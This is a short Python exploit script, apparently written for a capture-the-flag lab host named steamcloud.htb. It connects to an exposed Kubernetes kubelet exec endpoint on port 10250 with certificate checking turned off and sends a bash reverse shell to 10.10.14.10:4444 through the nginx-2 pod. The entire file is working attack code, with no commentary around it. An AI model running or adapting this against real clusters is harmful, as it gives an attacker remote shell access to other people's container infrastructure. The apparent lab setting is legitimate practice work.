import websocket
import ssl

def on_open(ws):
    rev_shell = "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'\n"
    ws.send(b"\x00" + rev_shell.encode())

ws = websocket.WebSocketApp(
    "wss://steamcloud.htb:10250/exec/default/nginx-2/nginx-2?command=sh&input=1&output=1&tty=1",
    on_open=on_open,
    header={
        "Origin": "https://steamcloud.htb",
        "Sec-WebSocket-Protocol": "v4.channel.k8s.io"
    }
)

ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})
